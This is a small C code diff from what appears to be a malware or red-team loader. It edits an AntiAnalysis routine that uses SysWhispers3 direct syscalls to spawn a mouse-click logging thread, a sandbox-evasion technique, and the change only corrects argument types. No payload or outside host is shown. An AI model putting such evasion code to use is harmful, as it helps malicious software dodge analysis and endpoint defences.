@@ -42,7 +42,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
             return FALSE;
 #else
         // Using SysWhispers3
-        if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+        if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, 0, (SIZE_T)0, (SIZE_T)0, NULL)) != 0) {
             DebugPrint("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
             return FALSE;
         }
